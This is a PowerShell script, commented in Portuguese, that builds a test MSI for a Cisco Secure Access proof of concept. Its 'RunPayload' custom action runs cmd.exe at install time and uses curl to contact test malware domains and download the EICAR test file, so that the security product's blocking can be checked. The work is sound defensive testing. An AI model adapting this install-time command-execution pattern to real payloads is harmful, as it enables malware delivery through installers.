$ErrorActionPreference = "Stop"

$msiPath = Join-Path $PSScriptRoot "poc-malicious-test.msi"
if (Test-Path $msiPath) { Remove-Item $msiPath -Force }

Write-Host ""
Write-Host "========================================================" -ForegroundColor Cyan
Write-Host "  POC Cisco Secure Access - Gerador de MSI de Teste"      -ForegroundColor Cyan
Write-Host "========================================================" -ForegroundColor Cyan
Write-Host ""

try {
    $installer = New-Object -ComObject WindowsInstaller.Installer
    $database  = $installer.OpenDatabase($msiPath, 3) # msiOpenDatabaseModeCreate

    function Invoke-MsiSQL {
        param([string]$sql)
        $view = $database.OpenView($sql)
        $view.Execute()
        $view.Close()
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($view) | Out-Null
    }

    # ---------------------------------------------------------------
    # 1. Summary Information
    # ---------------------------------------------------------------
    Write-Host "[1/8] Summary Information..." -ForegroundColor Yellow
    $si = $database.SummaryInformation(20)
    $si.Property(1)  = 1252
    $si.Property(2)  = "POC Malicious MSI Test"
    $si.Property(3)  = "Cisco Secure Access POC"
    $si.Property(4)  = "POC Lab"
    $si.Property(7)  = "Intel;1033"
    $si.Property(9)  = "{$([guid]::NewGuid().ToString().ToUpper())}"
    $si.Property(14) = 200
    $si.Property(15) = 0   # 0 = uncompressed (sem CAB)
    $si.Persist()
    Write-Host "       OK" -ForegroundColor Green

    # ---------------------------------------------------------------
    # 2. Property (obrigatoria)
    # ---------------------------------------------------------------
    Write-Host "[2/8] Tabela Property..." -ForegroundColor Yellow
    Invoke-MsiSQL "CREATE TABLE ``Property`` (``Property`` CHAR(72) NOT NULL, ``Value`` LONGCHAR NOT NULL LOCALIZABLE PRIMARY KEY ``Property``)"

    $pc = [guid]::NewGuid().ToString().ToUpper()
    $uc = [guid]::NewGuid().ToString().ToUpper()

    $properties = @(
        @("ProductCode",     "{$pc}"),
        @("UpgradeCode",     "{$uc}"),
        @("ProductVersion",  "1.0.0"),
        @("ProductName",     "POC Security Test"),
        @("Manufacturer",    "POC Lab"),
        @("ProductLanguage", "1033"),
        @("CMDPATH",         "cmd.exe")
    )
    foreach ($p in $properties) {
        Invoke-MsiSQL "INSERT INTO ``Property`` (``Property``, ``Value``) VALUES ('$($p[0])', '$($p[1])')"
    }
    Write-Host "       OK" -ForegroundColor Green

    # ---------------------------------------------------------------
    # 3. Directory (obrigatoria)
    # ---------------------------------------------------------------
    Write-Host "[3/8] Tabela Directory..." -ForegroundColor Yellow
    Invoke-MsiSQL "CREATE TABLE ``Directory`` (``Directory`` CHAR(72) NOT NULL, ``Directory_Parent`` CHAR(72), ``DefaultDir`` LONGCHAR NOT NULL LOCALIZABLE PRIMARY KEY ``Directory``)"
    Invoke-MsiSQL "INSERT INTO ``Directory`` (``Directory``, ``Directory_Parent``, ``DefaultDir``) VALUES ('TARGETDIR', '', 'SourceDir')"
    Invoke-MsiSQL "INSERT INTO ``Directory`` (``Directory``, ``Directory_Parent``, ``DefaultDir``) VALUES ('ProgramFilesFolder', 'TARGETDIR', '.')"
    Invoke-MsiSQL "INSERT INTO ``Directory`` (``Directory``, ``Directory_Parent``, ``DefaultDir``) VALUES ('INSTALLDIR', 'ProgramFilesFolder', 'POCTest:.')"
    Write-Host "       OK" -ForegroundColor Green

    # ---------------------------------------------------------------
    # 4. Component (obrigatoria)
    # ---------------------------------------------------------------
    Write-Host "[4/8] Tabela Component..." -ForegroundColor Yellow
    $cc = [guid]::NewGuid().ToString().ToUpper()
    Invoke-MsiSQL "CREATE TABLE ``Component`` (``Component`` CHAR(72) NOT NULL, ``ComponentId`` CHAR(38), ``Directory_`` CHAR(72) NOT NULL, ``Attributes`` SHORT NOT NULL, ``Condition`` CHAR(255), ``KeyPath`` CHAR(72) PRIMARY KEY ``Component``)"
    Invoke-MsiSQL "INSERT INTO ``Component`` (``Component``, ``ComponentId``, ``Directory_``, ``Attributes``) VALUES ('MainComponent', '{$cc}', 'INSTALLDIR', 0)"
    Write-Host "       OK" -ForegroundColor Green

    # ---------------------------------------------------------------
    # 5. Feature + FeatureComponents (obrigatorias)
    # ---------------------------------------------------------------
    Write-Host "[5/8] Tabelas Feature e FeatureComponents..." -ForegroundColor Yellow
    Invoke-MsiSQL "CREATE TABLE ``Feature`` (``Feature`` CHAR(38) NOT NULL, ``Feature_Parent`` CHAR(38), ``Title`` CHAR(64) LOCALIZABLE, ``Description`` CHAR(255) LOCALIZABLE, ``Display`` SHORT, ``Level`` SHORT NOT NULL, ``Directory_`` CHAR(72), ``Attributes`` SHORT NOT NULL PRIMARY KEY ``Feature``)"
    Invoke-MsiSQL "INSERT INTO ``Feature`` (``Feature``, ``Title``, ``Description``, ``Display``, ``Level``, ``Directory_``, ``Attributes``) VALUES ('MainFeature', 'Main', 'POC Feature', 1, 1, 'INSTALLDIR', 0)"

    Invoke-MsiSQL "CREATE TABLE ``FeatureComponents`` (``Feature_`` CHAR(38) NOT NULL, ``Component_`` CHAR(72) NOT NULL PRIMARY KEY ``Feature_``, ``Component_``)"
    Invoke-MsiSQL "INSERT INTO ``FeatureComponents`` (``Feature_``, ``Component_``) VALUES ('MainFeature', 'MainComponent')"
    Write-Host "       OK" -ForegroundColor Green

    # ---------------------------------------------------------------
    # 6. Media (obrigatoria)
    # ---------------------------------------------------------------
    Write-Host "[6/8] Tabela Media..." -ForegroundColor Yellow
    Invoke-MsiSQL "CREATE TABLE ``Media`` (``DiskId`` SHORT NOT NULL, ``LastSequence`` SHORT NOT NULL, ``DiskPrompt`` CHAR(64) LOCALIZABLE, ``Cabinet`` CHAR(255), ``VolumeLabel`` CHAR(32), ``Source`` CHAR(72) PRIMARY KEY ``DiskId``)"
    Invoke-MsiSQL "INSERT INTO ``Media`` (``DiskId``, ``LastSequence``) VALUES (1, 1)"
    Write-Host "       OK" -ForegroundColor Green

    # ---------------------------------------------------------------
    # 7. CustomAction (payload)
    # ---------------------------------------------------------------
    Write-Host "[7/8] CustomAction (payload malicioso)..." -ForegroundColor Yellow
    Invoke-MsiSQL "CREATE TABLE ``CustomAction`` (``Action`` CHAR(72) NOT NULL, ``Type`` SHORT NOT NULL, ``Source`` CHAR(72), ``Target`` LONGCHAR PRIMARY KEY ``Action``)"

    $cmdTarget = "/c " +
        "echo ============================================================ & " +
        "echo [MSI-POC] Cisco Secure Access - Teste Antimalware/Sandbox & " +
        "echo [MSI-POC] Data: %DATE% %TIME% & " +
        "echo ============================================================ & " +
        "echo. & " +
        "echo [1/3] Acessando examplemalwaredomain.com... & " +
        "curl.exe -v -m 10 http://examplemalwaredomain.com/test 2>&1 & " +
        "echo. & " +
        "echo [2/3] Acessando internetbadguys.com... & " +
        "curl.exe -v -m 10 http://internetbadguys.com/malware.exe 2>&1 & " +
        "echo. & " +
        "echo [3/3] Baixando EICAR test file... & " +
        "curl.exe -v -m 10 -o %TEMP%\eicar-msi-test.txt https://secure.eicar.org/eicar.com.txt 2>&1 & " +
        "echo. & " +
        "echo ============================================================ & " +
        "echo [MSI-POC] Teste concluido. Verifique os logs do Secure Access. & " +
        "echo ============================================================ & " +
        "timeout /t 30"

    # Tipo 114 = 50 (EXE via property) + 64 (continue on error)
    Invoke-MsiSQL "INSERT INTO ``CustomAction`` (``Action``, ``Type``, ``Source``, ``Target``) VALUES ('RunPayload', 114, 'CMDPATH', '$cmdTarget')"
    Write-Host "       OK" -ForegroundColor Green

    # ---------------------------------------------------------------
    # 8. InstallExecuteSequence
    # ---------------------------------------------------------------
    Write-Host "[8/8] InstallExecuteSequence..." -ForegroundColor Yellow
    Invoke-MsiSQL "CREATE TABLE ``InstallExecuteSequence`` (``Action`` CHAR(72) NOT NULL, ``Condition`` CHAR(255), ``Sequence`` SHORT PRIMARY KEY ``Action``)"

    $sequence = @(
        @("CostInitialize",    800),
        @("FileCost",          900),
        @("CostFinalize",      1000),
        @("InstallValidate",   1400),
        @("InstallInitialize", 1500),
        @("RunPayload",        1550),
        @("ProcessComponents", 1600),
        @("InstallFinalize",   6600)
    )
    foreach ($s in $sequence) {
        Invoke-MsiSQL "INSERT INTO ``InstallExecuteSequence`` (``Action``, ``Condition``, ``Sequence``) VALUES ('$($s[0])', '', $($s[1]))"
    }
    Write-Host "       OK" -ForegroundColor Green

    # ---------------------------------------------------------------
    # Commit e salvar
    # ---------------------------------------------------------------
    $database.Commit()

    Write-Host ""
    Write-Host "========================================================" -ForegroundColor Green
    Write-Host "  MSI gerado com sucesso!" -ForegroundColor Green
    Write-Host "  Arquivo: $msiPath" -ForegroundColor Green
    Write-Host "========================================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "Para executar:" -ForegroundColor Yellow
    Write-Host "  .\run-test.bat" -ForegroundColor White
    Write-Host ""
    Write-Host "Ou manualmente:" -ForegroundColor Yellow
    Write-Host "  msiexec /i `"$msiPath`" /qb" -ForegroundColor White
    Write-Host ""

} catch {
    Write-Host ""
    Write-Host "ERRO ao gerar MSI:" -ForegroundColor Red
    Write-Host "  $_" -ForegroundColor Red
    Write-Host "  $($_.ScriptStackTrace)" -ForegroundColor DarkRed
    Write-Host ""
} finally {
    if ($null -ne $database) {
        try { [System.Runtime.InteropServices.Marshal]::ReleaseComObject($database) | Out-Null } catch {}
    }
    if ($null -ne $installer) {
        try { [System.Runtime.InteropServices.Marshal]::ReleaseComObject($installer) | Out-Null } catch {}
    }
    [GC]::Collect()
    [GC]::WaitForPendingFinalizers()
}
